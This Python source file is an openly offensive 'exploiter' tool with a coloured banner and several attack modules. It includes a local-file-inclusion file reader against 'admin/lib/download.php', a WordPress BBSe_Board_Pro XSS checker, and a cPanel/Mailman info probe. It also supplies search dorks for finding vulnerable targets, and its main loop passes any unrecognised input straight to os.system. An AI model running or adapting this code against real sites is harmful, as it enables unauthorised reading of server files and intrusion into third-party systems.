try: 
    import os, sys, colorama, socket, requests, getpass
    from bs4 import BeautifulSoup
    from urllib.parse import urlparse
    from urllib.request import urlopen
    from colorama import *
except:
    # doesnt have proper packages installed error msg
    print("u are missing a packages, colorama, socket, requests, getpass, BeautifulSoup")

def banner():
    #banner 
    host_name = socket.gethostname() 
    g = Fore.GREEN
    m = Fore.MAGENTA
    w = Fore.WHITE
    r = Fore.RED
    print(f"""{g}
    

          
    
            {m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋     
       {m}                  _           _       _ _           _ 
     {w}_ __ ___   __ _  __| |___ _ __ | | ___ (_) |_  __   _/ |
    {m}| '_ ` _ \ / _` |/ _` / __| '_ \| |/ _ \| | __| \ \ / / |
    {w}| | | | | | (_| | (_| \__ \ |_) | | (_) | | |_   \ V /| |
    {m}|_| |_| |_|\__,_|\__,_|___/ .__/|_|\___/|_|\__|   \_/ |_|
           {w}                   |_|             
                     
                  {m}| {w}Version : {g}V1{m} 
                  {m}| {w}Created by {g}Nano{m} 
                  | {w}User : {g}{host_name}{m}
                  | {w}Exploits : {g}(5){m} 
                                                       
            {m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋{w}_{m}≋ 


               {w} Try using the help command!
    
    """)
banner()


def cpanel():
    r = Fore.RED
    w = Fore.WHITE
    y = Fore.YELLOW
    g = Fore.GREEN
    print(f"\n{w} [cpanel] {r}Cloudssp {w}Exploiter \n")
    x = input(f"{r} Target : {w}")
    url = x
    if x == "":
        print(f"{y} Maybe input a url ? ")
        return cpanel()
    
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
        q = requests.get(url+'/mailman/listinfo/mailman?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ', headers=headers)
        if q.status_code == 404:
            print(f"{r}Not Vuln")
            return main()
        
        rsp=requests.get(x, stream=True)
        rsp.raw._connection.sock.getpeername()
        print(f"\n {w}Url : {g}{x}")
        print(f"{w} Protected :{r}", rsp.raw._connection.sock.getpeername())
        soup = BeautifulSoup(q.text, 'html.parser')
        print(f"{w} Backend :", soup.find_all("a", text="Mailman"))
        return main()

    except:
        return main()
    

def bbse():
    r = Fore.RED
    w = Fore.WHITE
    y = Fore.YELLOW
    g = Fore.GREEN
    print(f" \n{w} bbse_board_pro {r}WordPress {w}Plugin {r}Xss")
    print(f"\n {w}Dork {r}: {w}inurl:'/wp-content/plugins/BBSe_Board_Pro'\n")

    x = input(f"{r} Target {w}: ")
    if x == "":
        print(f"\n{y} Maybe input a site ?")
        return bbse()
    

    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
        i = requests.get(f"{x}wp-content/plugins/BBSe_Board_Pro/show.php", headers=headers)
        if i.status_code == 404:
            print(f"\n {r}Not Vuln")
            return main()
        print(f"{r} Vuln {w}To {r}XSS {r}: {w}https://pastebin.com/W03hSqQp")
        return main()
        

    except:
        print(f"{r}Something Went Wrong Connecting to {w}: {x}")
        return main()

    



def hack():
    r = Fore.RED
    w = Fore.WHITE
    y = Fore.YELLOW
    g = Fore.GREEN
    print(f"\n{w}Invite{r}:")
    print(g)
    os.system("curl -XPOST https://www.hackthebox.eu/api/invite/generate -s | cut -c-70 | cut -c30-69 | base64 -d")
    print("\n")
    
    return main()

def gbb():
    r = Fore.RED
    w = Fore.WHITE
    y = Fore.YELLOW
    g = Fore.GREEN
    print(f"\n{w} [gbb] {r}panel {w}exploiter\n")
    print(f" {w}Dork {r}: {g}inurl:'admin/lib/download.php'")
    x = input(f"{r} Target :{w} ")
    if x == "":
        print(f"{y}Maybe input a url ? ")
        return gbb()
    try: 
        
        url = x 
        pp = requests.get(f"{url}admin/lib/download.php")
        
        if pp.status_code == 404:
            print(f"{r}Sorry Looks like We could not exploit : {w}{url}")
            return main()
        print(f"\n{g}Looks Like {x} is Vuln\n")
        s = input(f"{r}File : {w}")
        pay = s
        if s == "":
            print(f"{y}Input a file u to read")
            return gbb()
        
        w = requests.get(f"{url}admin/lib/download.php?fileurl=&filename={pay}")
        print(f"{g}Output: \n"+w.text)
        return main()

        

    except:
        print(f"{r} Couldnt Connect!!")
        return main()
    
    

def HELP():
    ## help command's 
    Y = Fore.YELLOW
    G = Fore.GREEN
    w = Fore.WHITE
    R = Fore.RED
    c = Fore.CYAN
    #host_name = socket.gethostname()
    #user = getpass.getuser()
    print(f"""
                {w}Exploits:
    {R}~ {w}1. {c}gbb {w}[gbb admin panel LFI Exploiter]
    {R}~ {w}2. {c}cpanel {w}[cpanel backend info leakage]
    {R}~ {w}3. {c}pwdd {w}[pwd LFI Exploiter] {R}(NOTWORKING)
    {R}~ {w}4. {c}hack {w}[hackthebox invite gen]
    {R}~ {w}5. {c}bbse {w}[bbse_board_pro wordPress plugin xss]

                {w}Commands:
    {R}~ {w}1. {c}clear {w}[clears the screen]

    """)
    return main()

def main():
    Y = Fore.YELLOW
    G = Fore.GREEN
    w = Fore.WHITE
    R = Fore.RED
    c = Fore.CYAN
    host_name = socket.gethostname()
    user = getpass.getuser()
    ## Just cool theme shit
    x = input(f"{w}{user}{Y}@{c}{host_name}:{R}~$ {w}")
    
    #print("Hostname :",host_name)
    if x == "help":
        HELP() 
    ##Starts gbb Exploiter 
    if x == "hack":
        hack()
    if x == "bbse":
        bbse()

    if x == "gbb":
        gbb()
    if x == "cpanel":
        cpanel()
    if x == "clear":
        try:

            os.system("clear")
            banner()
            return main()
        except:
            print(f"{R}/oops/")
            return main()
    try:
        os.system(f"{x}")
    except:
        return main()   
    return main()
main()
